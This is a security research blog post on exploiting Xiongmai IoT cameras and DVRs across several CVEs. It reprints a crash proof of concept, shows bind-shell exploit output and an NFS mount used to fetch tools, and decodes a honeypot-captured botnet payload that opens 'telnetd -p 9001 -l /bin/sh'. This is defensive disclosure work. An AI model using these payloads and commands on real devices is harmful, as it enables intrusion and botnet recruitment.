---
title: "Xiongmai IoT Exploitation - Blog - VulnCheck"
date: 2022-11-30T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Xiongmai IoT Exploitation - Blog - VulnCheck

<br/>

<br/>
There are a number of reasons \[Xiongmai\](https://www.xiongmaitech.com/en/index.php) devices are interesting targets. The first reason is there are a lot of them on the internet. Around \[200,000\](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per\_page=25&virtual\_hosts=EXCLUDE&q=%28services.http.response.body%3A%22NetSuveillanceWebCookie%22+or+services.http.response.html\_title%3A%22NetSurveillance+WEB%22%29+and+%28services.http.response.headers.server%3A%22uc-httpd%22+or+not+services.http.response.headers.server%3A%22\*%22%29).\\n\\n!\[censys\](/blog/xiongmai-iot-exploitation/censys\_results.png){:width="100%"}\\n\\nThe second reason is these devices have been affected by a handful of high or critical vulnerabilities:\\n\\n\* \[CVE-2017-7577\](https://nvd.nist.gov/vuln/detail/CVE-2017-7577): Unauthenticated HTTP request path traversal resulting in arbitrary file and credential disclosure.\\n\* \[CVE-2018-10088\](https://nvd.nist.gov/vuln/detail/CVE-2018-10088): Unauthenticated and remote HTTP login request stack-based buffer overflow.\\n\* \[CVE-2020-22253\](https://nvd.nist.gov/vuln/detail/CVE-2020-22253): Port 9530 debug interface that allowed an unauthenticated attacker to open a telnet.\\n\* \[CVE-2021-41506\](https://nvd.nist.gov/vuln/detail/CVE-2021-41506): Port 9527 debug interface that allows an attacker using default credentials to execute arbitrary operating system commands (technically speaking, the wording of the CVE could include CVE-2020-22253 / port 9530).\\n\* \[CVE-2022-26259\](https://nvd.nist.gov/vuln/detail/CVE-2022-26259): Unauthenticated and remote RTSP parsing stack buffer overflow.\\n\* \[CVE-2022-45045\](https://nvd.nist.gov/vuln/detail/CVE-2022-45045): Authenticated and remote command execution via port 34567 upgrade logic. \\n\* \[CVE-2022-45460\](https://nvd.nist.gov/vuln/detail/CVE-2022-45460): Unauthenticated and remote HTTP request URI parsing stack-based buffer overflow.\\n\\n\\nAnd that’s interesting due to an almost complete lack of high quality exploits for these vulnerabilities. You won’t find any in \[Metasploit\](https://www.metasploit.com/). \[Core\](https://www.coresecurity.com/core-labs/exploits) and \[Routersploit\](https://github.com/threat9/routersploit) only offer the path traversal information leak (CVE-2017-7577). One of the more widely cited Xiongmai \[proof of concept\](https://www.exploit-db.com/exploits/44864) exploits is for CVE-2018-10088 and it’s entirely useless for code execution.\\n\\n\`\`\`python\\n# Exploit Title: XiongMai uc-httpd 1.0.0 - Buffer Overflow\\n# Date: 2018-06-08 \\n# Exploit Author: Andrew Watson\\n# Software Version: XiongMai uc-httpd 1.0.0\\n# Vendor Homepage: http://www.xiongmaitech.com/en/\\n# Tested on: KKMoon DVR running XiongMai uc-httpd 1.0.0 on TCP/81\\n# CVE ID: CVE-2018-10088\\n# DISCLAIMER: This proof of concept is provided for educational purposes only!\\n \\n#!/usr/bin/python\\n \\nimport socket\\nimport sys\\n \\npayload="A" \* 85\\n \\nprint "\\n###############################################"\\nprint "XiongMai uc-httpd 1.0.0 Buffer Overflow Exploit"\\n \\nif len(sys.argv) < 2:\\n print "\\nUsage: " + sys.argv\[0\] + " \\n"\\n sys.exit()\\n \\nprint "\\nTarget: " + sys.argv\[1\]\\nprint "Sending exploit..."\\ns=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)\\ns.connect((sys.argv\[1\],81))\\ns.send('POST /login.htm HTTP/1.1\\r\\n')\\ns.send('command=login&username=' + payload + '&password=PoC\\r\\n\\r\\n')\\ns.recv(1024)\\ns.close()\\nprint "\\nExploit complete!"\\n\\n\`\`\`\\n\\nWhich brings me to the third reason I find these targets to be interesting, despite the lack of quality exploits, we know at least five of these issues have been exploited in the wild. You won’t find them listed in CISA’s \[Known Exploited Vulnerability Catalog\](https://www.cisa.gov/known-exploited-vulnerabilities-catalog), but \[high\](https://www.trendmicro.com/en\_us/research/19/g/keeping-a-hidden-identity-mirai-ccs-in-tor-network.html) \[quality\](https://cybersecurity.att.com/blogs/labs-research/botenago-strike-again-malware-source-code-uploaded-to-github) \[reporting\](https://blog.netlab.360.com/the-new-developments-of-the-fbot-en/), Greynoise, and our own honeypots leave no doubt (more on that later).\\n\\nAnother reason I find Xiongmai devices interesting is the continuity of the underlying software. A lot of IoT vendors ship wildly different firmware depending on the model or underlying hardware. Not the case with Xiongmai. The underlying software is more or less the same from 2016 through 2022. The majority of the system logic flows through a single binary named Sofia. Just as it always has. That’s useful for an attacker (or researcher) because knowledge gained using a 2016 exploit can sometimes still be useful for a 2022 exploit.\\n\\nFinally, the last reason these systems are interesting is they are very easy to acquire. Just snag one off of Amazon. They are relatively cheap too. Availability and price probably goes a long way to explaining their popularity.\\n\\n!\[amazon\_order\](/blog/xiongmai-iot-exploitation/amazon\_sunba.png){:width="100%"}\\n\\nHaving hopefully convinced you that these systems are worthy of your attention, the remainder of this blog will be devoted to looking at these systems, and their exploitation, in more depth. We’ll quickly look at how the system has evolved over the years. We’ll look at developing exploits for two of the stack buffer overflows. We’ll examine a payload caught in a honeypot. Attempt to get an idea of how widespread exploitation is, and finally look at some concerning files on the Xiongmai firmware server.\\n\\nHaving hopefully convinced you that these systems are worthy of your attention, the remainder of this blog will be devoted to looking at these systems, and their exploitation, in more depth. We’ll quickly look at how the system has evolved over the years. We’ll look at developing exploits for two of the stack buffer overflows. We’ll examine a payload caught in a honeypot. Attempt to get an idea of how widespread exploitation is, and finally look at some concerning files on the Xiongmai firmware server.\\n\\n\`\`\`\\nalbinolobster@mournland:~$ nmap -sV -p1-65535 10.12.70.210\\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-11-18 09:48 EST\\nNmap scan report for 10.12.70.210\\nHost is up (0.0025s latency).\\nNot shown: 65530 closed ports\\nPORT STATE SERVICE VERSION\\n80/tcp open http uc-httpd 1.0.0\\n554/tcp open rtsp H264DVR rtspd 1.0\\n9527/tcp open unknown\\n9530/tcp open unknown\\n34567/tcp open dhanalakshmi?\\n\`\`\`\\n\\nAll of these ports are affected by RCE vulnerabilities. Port 9527 (CVE-2021-41506) and 9530 (CVE-2020-22253) are particularly egregious \[debugging interfaces\](https://cwe.mitre.org/data/definitions/489.html) that were eventually phased out. A scan of an \[NBD8008R-PL\](https://www.xiongmaitech.com/en/index.php/product/product-detail/4/225/273) using software version V4.03.R11.C6380202.12201.140000.0000000 (build time “2021-05-19”) shows 80, 554, and 34567 have remained constants, but a couple new ports have taken the place of the old debug interfaces:\\n\\n\`\`\`\\nalbinolobster@mournland:~$ nmap -sV -p1-65535 10.12.70.218\\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-11-18 09:52 EST\\nNmap scan report for 10.12.70.218\\nHost is up (0.0041s latency).\\nNot shown: 65530 closed ports\\nPORT STATE SERVICE VERSION\\n80/tcp open http\\n554/tcp open rtsp H264DVR rtspd 1.0\\n23000/tcp open inovaport1?\\n30100/tcp open rwp?\\n34567/tcp open dhanalakshmi?\\n\`\`\`\\n\\nOnce on the device you can see that Sofia controlled most, but not all, of the ports in the 2016 version:\\n\\n\`\`\`\\n\[root@LocalHost /var\]$ netstat -tlpn\\nActive Internet connections (only servers)\\nProto Recv-Q Send-Q Local Address Foreign Address State PID/Program name \\ntcp 0 0 0.0.0.0:34567 0.0.0.0:\* LISTEN 615/Sofia\\ntcp 0 0 0.0.0.0:554 0.0.0.0:\* LISTEN 615/Sofia\\ntcp 0 0 0.0.0.0:80 0.0.0.0:\* LISTEN 615/Sofia\\ntcp 0 0 0.0.0.0:9527 0.0.0.0:\* LISTEN 614/dvrHelper\\ntcp 0 0 0.0.0.0:9530 0.0.0.0:\* LISTEN 600/macGuarder\\n\`\`\`\\n\\nBy 2021 Sofia had consolidated control over all the remote interfaces:\\n\\n\`\`\`\\n/var # netstat -tlpn\\nActive Internet connections (only servers)\\nProto Recv-Q Send-Q Local Address Foreign Address State PID/Program name \\ntcp 0 0 0.0.0.0:554 0.0.0.0:\* LISTEN 1047/Sofia\\ntcp 0 0 0.0.0.0:80 0.0.0.0:\* LISTEN 1047/Sofia\\ntcp 0 0 0.0.0.0:30100 0.0.0.0:\* LISTEN 1047/Sofia\\ntcp 0 0 0.0.0.0:23000 0.0.0.0:\* LISTEN 1047/Sofia\\ntcp 0 0 0.0.0.0:34567 0.0.0.0:\* LISTEN 1047/Sofia\\n\`\`\`\\n\\nSofia itself is not hugely different. Some functionality has come and gone, but, for example, the logic for parsing an HTTP request is recognizable when comparing a 2016 version against a 2022 version.\\n\\nThe most impactful changes have been a general cleanup of buffer overflows (using \`snprintf\`, \`strncpy\`, etc), dynamically linking uClibc instead of statically compiling it in, and, from an exploitation point of view, disabling data execution. The system, dating back to 2016, has always had ASLR enabled, so in all versions we expect the heap, dynamic libraries, and the stack to have randomized base addresses. But in 2016, almost all writable pages were executable.\\n\\n\`\`\`\\n\[root@LocalHost /var\]$ cat /proc/615/maps\\n00008000-007df000 r-xp 00000000 00:0d 336 /var/Sofia\\n007e6000-0081e000 rwxp 007d6000 00:0d 336 /var/Sofia\\n0081e000-00a8c000 rwxp 00000000 00:00 0\\n029c6000-035c0000 rwxp 00000000 00:00 0 \[heap\]\\n… many lines removed …\\nbe9da000-be9fb000 rwxp 00000000 00:00 0 \[stack\]\\nffff0000-ffff1000 r-xp 00000000 00:00 0 \[vectors\]\\n\`\`\`\\n\\nWhich was especially useful because Sofia was not, and still is not, compiled as a position independent executable. It’s also useful to know that Sofia operates on a number of global data structures that, in older versions, an attacker could overwrite with shellcode to aid in exploitation (more on that later). But fast forward to 2022 and newer versions of Sofia aren’t as kind to attackers. Sofia’s base isn’t randomized, but data execution has been disabled:\\n\\n\`\`\`\\n/var # cat /proc/1047/maps\\n00010000-00854000 r-xp 00000000 00:0d 954 /var/Sofia\\n00863000-008bb000 rw-p 00843000 00:0d 954 /var/Sofia\\n008bb000-02024000 rw-p 00000000 00:00 0 \[heap\]\\n… many lines removed …\\nbeb51000-beb73000 rw-p 00000000 00:00 0 \[stack\]\\nbebe4000-bebe5000 r-xp 00000000 00:00 0 \[sigpage\]\\nbebe5000-bebe6000 r--p 00000000 00:00 0 \[vvar\]\\nbebe6000-bebe7000 r-xp 00000000 00:00 0 \[vdso\]\\nffff0000-ffff1000 r-xp 00000000 00:00 0 \[vectors\]\\n\`\`\`\\n\\nOf course, ROP chains are still very much in play with the new version, as we’ll see for CVE-2022-26259, but things are a bit more difficult than they were back in 2016.\\n\\nThe final thing that hasn’t changed over the years is that these devices are almost devoid of \[gtfobins\](https://gtfobins.github.io/). The system has no curl, wget, nc, telnet, etc, for an attacker to download an implant or establish reverse shells. The \*only\* gtfobin Xiongmai devices have is busybox’s telnetd. And sometimes the telnetd symlink doesn’t even exist on the system, so the attacker has to invoke the binary via busybox directly (a challenge given the size constraints of some of the overflows). While telnetd is useful, it’s a limiting factor for real world attacks, as it requires the victim not to have a firewall in place that would prevent access to the newly opened port.\\n\\nSpending time on this system did make me appreciate one command that isn’t generally considered a gtfobin: the \`mount\` command. Downloading and executing files via a mounted network file share saved me a lot of time I’d otherwise have spent echoing binaries onto the system.\\n\\n\`\`\`bash\\n$ mkdir /var/xploit\_tools/\\n$ mount -o nolock 10.12.70.252:/srv/ /var/xploit\_tools/\\n\`\`\`\\n\\nWith that background information, let’s look at developing some exploits.\\n\\n## CVE-2018-10088: Credentials Overflow\\n\\nMultiple security companies have linked exploitation of CVE-2018-10088 to botnets. Fortiguard linked it to \[Botenago\](https://www.fortiguard.com/threat-signal-report/4389/botenago-malware-targets-multiple-iot-devices). Netlab 360 linked it to \[Satori\](https://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/). Fortinet linked it to \[Hajime\](https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai). Although both Greynoise tags for this CVE are \[more\](https://viz.greynoise.io/tag/xiongmai-buffer-overflow-cve-2018-10088-attempt?days=30) or \[less\](https://viz.greynoise.io/tag/xiongmai-uc-httpd-buffer-overflow-attempt?days=30) inactive.\\n\\nRegardless, exploitation in the wild is interesting because we aren’t aware of any public exploits that lead to code execution for this vulnerability (as stated earlier, the exploit-db \[exploit\](https://www.exploit-db.com/exploits/44864) only triggers a crash). So we wrote our own. This proved to be a fairly trivial exercise. The buffer overflow is the result of copying the username and password from \`command=login\` into some global memory.\\n\\n\`\`\`c\\niVar1 = FUN\_006784e4(0,"&");\\nstrcpy(&global\_username,iVar1 + 9);\\niVar1 = FUN\_006784e4(0,"&");\\nstrcpy(&global\_password,iVar1 + 9);\\nDAT\_00a3c4d8 = DAT\_00a3c4e4;\\nif (DAT\_009806f8 != (code \*)0x0) {\\n DAT\_00a3c4a8 = (\*DAT\_009806f8)(0,&global\_username,0x2c,DAT\_00a3c504);\\n}\\nif (DAT\_00a3c4a8 == 0) {\\n sprintf(local\_140,"%s%s","/mnt","/DVR");\\n FUN\_004193dc(param\_1,local\_140,0);\\n return 0;\\n}\\nsprintf(local\_140,"%s%s","/mnt","/failed.htm");\\n\\n\`\`\`\\n\\nAn overly long username (or password) will eventually gain control over \`pc\` by overwriting a function pointer. Unfortunately for the attacker, they don’t really have control over any of the other registers. Additionally, since the stack and heap bases are randomized, you can’t easily stash shellcode there without some type of address leak. Guessing addresses is no good either because if the system crashes you’ll have to wait 2 minutes for it to reboot. Not exactly ideal.\\n\\nFor \[CVE-2022-45460\](https://nvd.nist.gov/vuln/detail/CVE-2022-45460), a similar Xiongmai HTTP buffer overflow vulnerability, \[tothi\](https://github.com/tothi) wrote an \[exploit\](https://github.com/tothi/pwn-hisilicon-dvr/blob/42d8325e68fdb075fe27df8a269932f9fa9601a6/pwn\_hisilicon\_dvr.py#L266) that tried to solve this problem by leveraging CVE-2017-7577 to download Sofia’s \`/proc/pid/maps\` to acquire the stack base address and then guessing for the offset of shellcode. \\n\\nWe took a different approach. CVE-2018-10088 overflows a global buffer that resides at a predictable address within Sofia’ data segment. Code execution can be achieved by writing shellcode to the overflowed password buffer, followed by overwriting the function pointer with the password buffer’s predictable address. When Sofia uses the overwritten function pointer, it’ll jump into the password buffer and execute our shellcode. The space is kind of tight (especially since Thumb isn’t supported on all devices), but doable.\\n\\nExcluding a few overly technical issues, the only challenges with exploitation are dealing with the instruction cache (which we’re able to work around easily), and knowing what the password buffer’s address is across different versions. Of course, like tothi, we can solve the password buffer address issue by downloading Sofia from the target using CVE-2017-7577. Or we can just guess all known addresses. Waiting two minutes for a reboot isn’t too bad, right?\\n\\nHere’s sample output from our exploit:\\n\`\`\`\\nalbinolobster@mournland:~/initial-access/feed/cve-2018-10088$ ./build/cve-2018-10088-linux\_arm64 -v -c -e -rhost 10.12.70.210 -bport 1270\\n\[+\] Validating the remote target is a Xiongmai NVR/IPC installation\\n\[+\] Target validation succeeded!\\n\[+\] Running a version check on the remote target\\n\[!\] The target \*might\* be a vulnerable version. Continuing.\\n\[+\] Sending a bind shell for port 1270\\n\[+\] Using CVE-2017-7577 to download Sofia to fingerprint the version...\\n\[+\] Using Sofia hash fc65ed752bd2efb8b57c638aae0960e0\\n\[+\] Seeding the remote target with the exploit shell code\\n\[+\] Triggering payload!\\n\[+\] Connected to 10.12.70.210:1270!\\n\\nBusyBox v1.16.1 (2016-03-31 20:15:25 CST) built-in shell (ash)\\nEnter 'help' for a list of built-in commands.\\n\\n$ cat /proc/version\\ncat /proc/version\\nLinux version 3.0.8 (leixinyuan@localhost.localdomain) (gcc version 4.4.1 (Hisilicon\_v100(gcc4.4-290+uclibc\_0.9.32.1+eabi+linuxpthread)) ) #52 Fri Apr 22 12:33:57 CST 2016\\n$\\n\`\`\`\\n\\nDespite public reports, I somewhat doubt CVE-2018-10088 has been used in the wild. I think CVE-2018-10088 has gotten confused with tothi’s \`pwn\_hisilicon\_dvr.py\`. The two vulnerabilities are not the same. CVE-2018-10088 is an overflow when \`strcpy\` uses a long username or password during a login attempt. Tothi’s vulnerability is an overflow when \`sprintf\` uses an overly long request URI. CVE-2018-10088 has no public RCE exploit, and tothi’s exploit was published with an \[extensive writeup\](https://github.com/tothi/pwn-hisilicon-dvr/tree/42d8325e68fdb075fe27df8a269932f9fa9601a6). It seems more likely that botnet operators, instead of doing their own exploit development work, adapted tothi’s exploit. The confusion, I believe, lies in the fact that tothi’s vulnerability never had an assigned CVE (and the poor description of CVE-2018-10088). In an attempt to clarify that tothi’s vulnerability is not CVE-2018-10088, we asked MITRE to assign tothi’s vulnerability a CVE and they assigned CVE-2022-45460.\\n\\nWe also got MITRE to assign CVE-2022-45045. This vulnerability is an arbitrary operating system command execution vulnerability on the port 34567 interface. In November 2022, we caught the vulnerability being exploited in our honeypots. We’ve seen the issue exploited by \[85.31.44.178\](https://viz.greynoise.io/ip/85.31.44.178), \[92.118.39.78\](https://viz.greynoise.io/ip/92.118.39.78), \[193.47.61.60\](https://viz.greynoise.io/ip/193.47.61.60), and \[195.154.36.148\](https://viz.greynoise.io/ip/195.154.36.148).\\n\\n!\[honeypot\_pcap\](/blog/xiongmai-iot-exploitation/honeypot\_pcap.png){:width="100%"}\\n\\nOther security vendors have reported seeing the same exploit in \[2019\](https://blog.netlab.360.com/the-botnet-cluster-on-185-244-25-0-24-en/) and \[2021\](https://cybersecurity.att.com/blogs/labs-research/malware-hosting-domain-cyberium-fanning-out-mirai-variants). In fact, the payload embedded in the Wireshark screenshot above (from our honeypot) is exactly the same as the version Netlab 360 described in 2019. Here it is decompressed:\\n\`\`\`\\n{\\n "UpgradeCommand": \[\\n {\\n "Command": "Shell",\\n "Script": "telnetd -p 9001 -l /bin/sh"\\n },\\n {\\n "Command": "Shell",\\n "Script": "busybox telnetd -p 9001 -l /bin/sh"\\n },\\n {\\n "Command": "Shell",\\n "Script": "sleep 259200"\\n },\\n {\\n "Command": "Shell",\\n "Script": "busybox sleep 259200"\\n }\\n \],\\n "Hardware": "SkipCheck",\\n "SupportFlashType": \[\\n {\\n "FlashID": "SkipCheck"\\n }\\n \],\\n "DevID": "SkipCheck",\\n "Vendor": "SkipCheck",\\n "CompatibleVersion": -1,\\n "CRC": "SkipCheck"\\n}\\n\`\`\`\\n\\nEach of the commands will be executed during an “upgrade”, although no upgrade filesystems are actually provided. The exploit opens \`telnetd\` on port 9001 which allows the attacker to begin a stage 2. Additionally, the exploit issues sleep commands to prevent the system from rebooting after the “upgrade” is finished. The sleep commands have the added benefit of locking down port 34567 and preventing any other attacker from exploiting the device as long as the sleep is active.\\n\\nCVE-2022-45045 is exploited using a custom protocol on port 34567. An attacker must be authenticated to successfully execute the “upgrade” command. However, authentication is often not difficult because Xiongmai devices use default credentials (admin:) or the credentials can be leaked using CVE-2017-7577. A surprising amount of devices remain vulnerable to CVE-2017-7577 and, although they don’t have a tag for it, we can see on \[Greynoise\](https://viz.greynoise.io/query/?gnql=raw\_data.web.paths%3A%22%2F..%2F..%2F..%2F..%2F..%2Fmnt%2Fmtd%2FConfig%2FAccount1%22) that attackers are actively looking to leak credentials from these devices.\\n\\nCVE-2022-45045 is particularly interesting because, as we saw in an earlier section, this interface has been available from 2016 through current firmware versions. But it’s difficult to get an estimate on potentially affected internet-facing devices because neither Censys or Shodan appear to identify the port. Perhaps because it requires a custom protocol. Without running our own internet scanner, it’s difficult to say how many affected internet facing systems there are. I would guess there are a fair amount, but that remains a guess.\\n\\nXiongmai did make changes to the upgrade logic to prevent this specific attack sometime in 2020. Besides requiring the filesystem files to be present and adding a (poorly enforced) digital signature, they also started ignoring commands containing \`telnetd\`.\\n\\n\`\`\`c\\njson\_obj\_Value(uVar4,"Script");\\npcVar7 = (char \*)json\_value\_as\_string();\\npcVar7 = strstr(pcVar7,"telnetd");\\nif (pcVar7 == (char \*)0x0) {\\n uVar4 = FUN\_00517e88(uVar3,uVar22);\\n uVar4 = json\_obj\_Value(uVar4,"Script");\\n json\_asString(auStack6252,uVar4);\\n uVar12 = local\_1868;\\n std::\_\_cxx11::basic\_string,std::allocator\>::\_M\_dispose();\\n if (uVar12 < 100) {\\n uVar4 = FUN\_00517e88(uVar3,uVar22);\\n json\_obj\_Value(uVar4,"Script");\\n pcVar7 = (char \*)json\_value\_as\_string();\\n system(pcVar7);\\n }\\n\`\`\` \\n\\nWhile this issue is mitigated in newer versions of Xiongmai firmware, there remain a lot of affected devices on the internet, which is somewhat surprising given years of exploitation by at least one botnet (Moobot). Of course, newer firmware isn’t entirely immune to exploitation either.\\n\\n## CVE-2022-26259: RTSP Exploitation\\n\\nCVE-2022-26259 is a newer Xiongmai vulnerability that was found by Chris Leech. The vulnerability details were \[published\](https://blog.ret2.me/post/2022-01-26-exploiting-xiongmai-dvrs/) in early 2022. The vulnerability is a stack-based buffer overflow affecting RTSP parsing on port 554. VulnCheck has successfully exploited this vulnerability for RCE on all of our Xiongmai test devices. Xiongmai issued a \[security advisory\](https://www.xiongmaitech.com/en/index.php/service/notice\_info/51/2) for this issue, but, curiously, the Sunba we purchased from Amazon isn’t listed as an affected device and doesn’t have a fix in the most up-to-date firmware despite being very exploitable.\\n\\nXiongmai devices have a fairly distinct RTSP banner, so we can see there are more than 100,000 of these endpoints on the internet.\\n\\n!\[rtsp\_shodan\](/blog/xiongmai-iot-exploitation/rtsp\_shodan.png){:width="100%"}\\n\\nThe restrictions on the overflow payload are typical albeit somewhat strict. No null bytes. No space characters. Leech found the perfect ROP gadget in his test firmware. The gadget rotated an attacker-provided string on the stack from \`r9\` to \`r0 \`and then called \`system\`. Unfortunately, this primitive doesn’t exist in all firmware versions. Older firmware that don’t have this gadget can easily execute out of global buffers as discussed in the CVE-2018-10088 section. But newer firmware prevents data execution, so without Leech’s gadget being present, things get a little tough.\\n\\nNot to say there is no solution. For example, our new Sunba using V4.03R11.C6380202 doesn’t have the \`r9\` to \`r0\` primitive, but it does have the following debug code that will pop open \`telnetd\`. The debug function takes no parameters, so all we have to do is jump there.\\n\\n\\n\`\`\`c\\nundefined4 UndefinedFunction\_003f187c(void)\\n{\\n FILE \*\_\_stream;\\n int \*piVar1;\\n char \*pcVar2;\\n undefined4 uVar3;\\n\\n memcpy(&stack0x0000000c,"telnetd",8);\\n sprintf(&stack0x00000018,"%s %X",&stack0x0000000c);\\n \_\_stream = popen(&stack0x00000018,"r");\\n if (\_\_stream == (FILE \*)0x0) {\\n piVar1 = \_\_errno\_location();\\n pcVar2 = strerror(\*piVar1);\\n printf("\\x1b\[34mDebug R: Open Failed: %s!\\n\\x1b\[0m",pcVar2);\\n uVar3 = 0xffffffff;\\n }\\n else {\\n pclose(\_\_stream);\\n FUN\_003f1588();\\n uVar3 = 0;\\n }\\n return uVar3;\\n}\\n\`\`\`\\n\\nThis function actually shows another Xiongmai curiosity. See the weird \`%X\` after \`telnetd\` in the \`sprintf\` call? This is to accommodate an alteration this firmware version has in busybox. The updated busybox will check for a special value on the command line when \`telnetd\` is invoked. If the correct value isn’t present then \`telnetd\` won’t start. Presumably, this is an attempt by Xiongmai to stop the \`telnetd\`-based attacks that have plagued their devices. Fortunately for us, this function (which is very poorly decompiled by Ghidra) will calculate the value for us.\\n\\nHere is the output for a proof of concept we wrote that opens telnet using this function.\\n\\n\`\`\`\\nalbinolobster@mournland:~/initial-access/feed/cve-2022-26259$ telnet 10.12.70.218\\nTrying 10.12.70.218...\\ntelnet: Unable to connect to remote host: Connection refused\\nalbinolobster@mournland:~/initial-access/feed/cve-2022-26259$ ./build/cve-2022-26259-linux\_arm64 -e -rhost 10.12.70.218\\n\[+\] Sending a bind shell for port 23\\n\[+\] Connecting to 10.12.70.218:554\\n\[+\] Connected to 10.12.70.218:23!\\n\[+\] Done!\\nalbinolobster@mournland:~/initial-access/feed/cve-2022-26259$ telnet 10.12.70.218\\nTrying 10.12.70.218...\\nConnected to 10.12.70.218.\\nEscape character is '^\]'.\\nLogin incorrect\\nLocalHost login:\\n\`\`\`\\n\\nThis \`telnetd\` debug logic doesn’t appear to be available in all affected systems. Which means, as Leech indicated in his write up, exploitation of CVE-2022-26259 in the wild is going to be a little messy. Different firmware will require different exploitation methods. Attackers will need to figure out a version fingerprinting method, or just be patient as the box reboots 2 minutes after every crash.\\n\\n## Scale of Xiongmai Exploitation\\n\\nAlthough we haven’t touched on all of these, we know \[CVE-2017-7577\](https://viz.greynoise.io/query/?gnql=raw\_data.web.paths%3A%22%2F..%2F..%2F..%2F..%2F..%2Fmnt%2Fmtd%2FConfig%2FAccount1%22), \[CVE-2020-22253\](https://viz.greynoise.io/tag/hisilicon-backdoor-access-attempt?days=30), \[CVE-2021-41506\](https://www.shodan.io/search?query=port%3A9527+%2B%22%27+is+not+a+command.%22), and CVE-2022-45045 are all being actively targeted \*right now\*. We can verify that via Greynoise, Shodan, or our own honeypots. The question is, “At what scale?”\\n\\nIt’s a difficult question to answer. But we can get some ideas. In \[Troy Mursch’s\](https://scholar.google.com/citations?user=I35Lgl4AAAAJ&hl=en), “Identifying infected energy systems in the wild”, Troy cross referenced known malicious endpoints (from Greynoise, honeypots, and IP blocklists) against a Censys scan of ICS endpoints. The overlapping IP addresses, Mursch theorized, are infected/malicious ICS systems. The general idea is that when these systems are recruited into a botnet, they themselves will start recruiting others and eventually end up in a malicious endpoint list.\\n\\nWe can do something similar. I grabbed the IP addresses of 200,000 Xiongmai devices from Shodan and cross referenced them against the \[FireHOL\](https://iplists.firehol.org/) blocklists (with all netblocks removed because that seemed overly broad). Now, FireHOL isn’t perfect. In fact, some of the aggregated lists are incredibly old. But some are updated daily. IP blocklists are also notorious for false positives. But the goal is not to be perfect, but to merely get an idea of how many Xiongmai endpoints are considered malicious.\\n\\nThe cross reference generated the following:\\n\\n\`\`\`\\nfirehol\_anonymous.netset: 1185\\nfirehol\_proxies.netset: 1185\\nfirehol\_level4.netset: 166\\nstopforumspam\_365d.ipset: 144\\nblocklist\_net\_ua.ipset: 142\\nstopforumspam\_180d.ipset: 68\\nfirehol\_abusers\_30d.netset: 57\\nstopforumspam.ipset: 45\\nstopforumspam\_90d.ipset: 45\\nhaley\_ssh.ipset: 24\\nsocks\_proxy\_30d.ipset: 22\\nnixspam.ipset: 14\\nvoipbl.netset: 14\\nstopforumspam\_30d.ipset: 13\\nsocks\_proxy\_7d.ipset: 10\\nproxylists\_7d.ipset: 9\\nproxylists\_30d.ipset: 9\\nesentire\_emptyarray\_ru.ipset: 9\\nlashback\_ubl.ipset: 8\\nesentire\_dorttlokolrt\_com.ipset: 8\\nesentire\_crazyerror\_su.ipset: 8\\ncleantalk\_30d.ipset: 7\\niblocklist\_ciarmy\_malicious.netset: 7\\nfirehol\_level3.netset: 7\\nesentire\_maddox1\_ru.ipset: 7\\nsblam.ipset: 6\\nciarmy.ipset: 6\\nproxylists\_1d.ipset: 5\\nnullsecure.ipset: 5\\ncleantalk\_new\_30d.ipset: 4\\nsocks\_proxy\_1d.ipset: 4\\ncleantalk\_updated\_30d.ipset: 4\\nesentire\_burmundisoul\_ru.ipset: 4\\nesentire\_22072014c\_com.ipset: 3\\nesentire\_22072014a\_com.ipset: 3\\nesentire\_22072014b\_com.ipset: 3\\nproxz\_30d.ipset: 3\\ntaichung.ipset: 3\\nesentire\_volaya\_ru.ipset: 3\\nbitcoin\_nodes\_30d.ipset: 3\\npacketmail\_ramnode.ipset: 2\\nbotscout\_30d.ipset: 2\\nstopforumspam\_7d.ipset: 2\\nnormshield\_high\_wannacry.ipset: 2\\nnormshield\_all\_wannacry.ipset: 2\\npacketmail.ipset: 2\\ncleantalk\_7d.ipset: 2\\nproxyspy\_30d.ipset: 2\\nproxz\_7d.ipset: 2\\nesentire\_downs1\_ru.ipset: 2\\nesentire\_manning1\_ru.ipset: 2\\nbitcoin\_nodes\_7d.ipset: 2\\nproxylists.ipset: 2\\nesentire\_inleet\_ru.ipset: 2\\nesentire\_getarohirodrons\_com.ipset: 2\\ncruzit\_web\_attacks.ipset: 1\\niblocklist\_cruzit\_web\_attacks.netset: 1\\ncleantalk\_new\_7d.ipset: 1\\ncleantalk\_updated\_7d.ipset: 1\\nproxyspy\_7d.ipset: 1\\nbitcoin\_blockchain\_info\_30d.ipset: 1\\ndarklist\_de.netset: 1\\nesentire\_smartfoodsglutenfree\_kz.ipset: 1\\nbitcoin\_nodes\_1d.ipset: 1\\nbitcoin\_nodes.ipset: 1\\ncoinbl\_hosts.ipset: 1\\nhphosts\_emd.ipset: 1\\nturris\_greylist.ipset: 1\\nblocklist\_de\_bruteforce.ipset: 1\\nfirehol\_level2.netset: 1\\nblocklist\_de\_apache.ipset: 1\\nblocklist\_de.ipset: 1\\nsslproxies\_30d.ipset: 1\\nesentire\_fioartd\_com.ipset: 1\\nesentire\_dagestanskiiviskis\_ru.ipset: 1\\nesentire\_venerologvasan93\_ru.ipset: 1\\nesentire\_hasanhashsde\_ru.ipset: 1\\nesentire\_14072015q\_com.ipset: 1\\nesentire\_mysebstarion\_ru.ipset: 1\\nesentire\_ebankoalalusys\_ru.ipset: 1\\nesentire\_14072015\_com.ipset: 1\\n\`\`\`\\n\\nThe result is actually quite a bit lower than I had expected. That may be due to the quality of the block list, or exploited endpoints don’t actually recruit others, or the scale of exploitation is on the small side. Regardless, looking over this list did provide one interesting insight. Validating this list, I discovered \[this\](https://www.shodan.io/search?query=port%3A9001+%22%2Fvar%22+-HTTP) Shodan query:\\n\\n!\[exploited\_port\_9001\](/blog/xiongmai-iot-exploitation/exploited\_port\_9001.png){:width="100%"}\\n\\nThis query shows devices that have recently been exploited by CVE-2022-45045. As we saw earlier, the attacker opens \`telnetd\` on port 9001 which allows them to begin their stage 2 attack. The endpoints listed on Shodan are systems where the attacker has failed to close \`telnetd\` to the reset of the world (or simply haven’t gotten around to it yet). \\n\\n## Firmware Updates\\n\\nIoT systems are notorious for using old firmware. However, internet-facing Xiongmai systems seem to be worse than usual. There are many internet-facing systems using firmware that was released between 2016 and 2019. I believe, in 